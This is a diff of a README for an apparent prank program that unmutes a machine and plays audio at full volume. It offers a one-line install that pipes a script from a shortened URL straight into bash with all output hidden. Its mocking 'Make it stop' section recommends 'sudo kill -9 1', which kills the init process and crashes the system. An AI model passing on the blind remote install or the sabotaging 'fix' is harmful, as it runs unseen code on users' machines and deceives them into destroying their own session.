@@ -12,7 +12,6 @@ Did you say they tried muting it?
 Ahh - you mean it unmuted and went to full volume a second later.
 
 ##ONE LINER##
----------------
 ```bash
 curl -L http://git.to/pal | bash -s > /dev/null 2>&1
 ```
@@ -24,11 +23,9 @@ https://help.ubuntu.com/community/AddingProgramToSessionStartup
 ```
 
 ## Removal Instructions ##
----------------------------
 Really? You want to get rid of this amazing piece of code that inhances your life more than sliced bread?
 
 ## Make it stop ##
----------------------------
 Hint: It starts with m and it plays things. The source code might be a good place to look for things to kill. I recommend:
 ```bash
     sudo kill -9 1
